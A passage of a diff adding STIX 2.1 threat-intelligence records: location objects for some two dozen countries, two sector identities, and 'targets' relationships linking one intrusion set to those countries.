+        },
+        {
+            "type": "relationship",
+            "id": "relationship--91f12b1d-7e39-45d8-9c22-cd4022f8a4c3",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--f98281ee-b38c-4715-bb1c-bd39a1f2fef5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--fe518501-52ff-483f-98c4-849f50880931",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--c5306215-789f-4844-88a8-7f7d5dc5ad63"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--1f817fe8-6959-47d5-9f63-1960128e5316",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--d3103127-bf9d-4c04-b9bf-8a53966b287a"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--9805075f-43bd-4c38-99a8-0102721ef35a",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--8ce3f13d-02f9-410b-85a9-2d7593d5162f"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ac58638f-c8f9-46d8-9c17-35c629fd3841",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--4a392c29-881a-4d82-84f7-5341acc18ee6"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--5374d26b-bcaf-4a66-94dc-49b57e91b4ba",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851"
+        },
+        {
+            "created": "2021-03-13T20:09:21.308954Z",
+            "id": "identity--944ebdb0-97ef-463b-a3a9-52da871fcf64",
+            "identity_class": "class",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Financial Services sector as a target",
+            "sectors": [
+                "financial-services"
+            ],
+            "spec_version": "2.1",
+            "type": "identity"
+        },
+        {
+            "created": "2021-03-13T20:09:21.317437Z",
+            "id": "identity--03e23f6c-0ac9-4b47-9c84-f718132adb21",
+            "identity_class": "class",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Hospitality Leisure sector as a target",
+            "sectors": [
+                "hospitality-leisure"
+            ],
+            "spec_version": "2.1",
+            "type": "identity"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--59c13dbc-0886-4a54-ad89-03f46d47f0e2",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Australia",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.192392Z",
+            "id": "location--de067901-d26f-4454-bdcd-b6d6b996b368",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Brazil",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--db70048f-7bb6-42d7-b826-7f7422f29ce6",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Canada",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--f6f6863a-41c0-4108-8a46-880e62ba1aca",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "China",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--e6e4a646-6504-43af-b43f-03b6379d3027",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "France",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--da23145d-8abe-40bf-9f8f-596562a3cb9f",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Germany",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "country": "HK",
+            "created": "2021-03-13T20:09:21.009864Z",
+            "id": "location--e6da102a-de9c-4d64-9a13-b587962a1fc5",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Hong Kong",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "India",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--105e8fa0-4821-454b-b0c3-d1434304dccf",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Luxembourg",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--1459143e-a354-47bc-9754-1b50f37d319a",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Norway",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--b9235e9d-2ab7-44e4-9f80-5f31f0f5abd0",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Pakistan",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--c5306215-789f-4844-88a8-7f7d5dc5ad63",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Russia",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--f98281ee-b38c-4715-bb1c-bd39a1f2fef5",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Poland",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--7eac9bc3-6f7e-4c83-959c-fe7f3342389c",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Spain",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--d3103127-bf9d-4c04-b9bf-8a53966b287a",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Switzerland",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--8ce3f13d-02f9-410b-85a9-2d7593d5162f",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Taiwan",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--4a392c29-881a-4d82-84f7-5341acc18ee6",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "United Kingdom",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "United States",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--ee993c53-ddff-4d64-b3d0-fe0b0f5965e5",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Ukraine",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--30598d43-827b-4fa6-99ba-0aab6c3c546c",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--e6da102a-de9c-4d64-9a13-b587962a1fc5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--f2d11b33-7879-40c8-a173-ef9e5b974499",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--ee993c53-ddff-4d64-b3d0-fe0b0f5965e5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ba7f0c61-af33-4cd2-899f-b7961bf63eb7",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--e6e4a646-6504-43af-b43f-03b6379d3027"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--f329e426-984c-4e1e-b0d1-93f4527f2029",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--7eac9bc3-6f7e-4c83-959c-fe7f3342389c"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--e8041cea-e39d-4f5b-81c3-ccd6445572fd",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--de067901-d26f-4454-bdcd-b6d6b996b368"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--62ecf2cf-14de-4fef-8160-3b34fc585c7f",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Uzbekistan",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--6a1902be-30f4-4fd8-99f3-4d259685ea80",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Sweden",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--df69c7d7-fe94-43ea-afc8-80413cd6d692",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Austria",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--7819b527-8ca5-4a52-b55e-b77f60fd8b80",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Bulgaria",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--9cc2dee0-19a4-4a8d-a1e9-a7a81c080762",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Czech",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--4b24cc06-f863-4461-9361-aa178a6c06ff",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Iceland",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--cd382024-345f-429a-bbdb-5b904143495d",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Morocco",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--59aae7d5-5ddb-4f51-9d87-af62570cc1e0",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--cd382024-345f-429a-bbdb-5b904143495d"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--f7aea3b8-571d-43a9-a7bc-8150ed227735",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--4b24cc06-f863-4461-9361-aa178a6c06ff"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--fd57057f-b20b-41d8-a35e-dc127ba14129",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--883b2eb1-43ea-4bf1-882e-510c5ad0db04"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--883b2eb1-43ea-4bf1-882e-510c5ad0db04",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Nepal",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--7c4be04c-e329-407f-bfce-75437674d76d",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--9cc2dee0-19a4-4a8d-a1e9-a7a81c080762"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ebec02fa-ef8c-4a20-9ea1-9f8736bcf92a",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--7819b527-8ca5-4a52-b55e-b77f60fd8b80"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--14044291-afdc-4838-bb3d-7a7b915a243b",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--df69c7d7-fe94-43ea-afc8-80413cd6d692"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--698dc420-e858-46c4-8a57-3c4cee0e6b85",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--62ecf2cf-14de-4fef-8160-3b34fc585c7f"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--c5230f81-6552-4e16-9f20-ce6744eed2dd",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--6a1902be-30f4-4fd8-99f3-4d259685ea80"
+        }
+    ]
+}
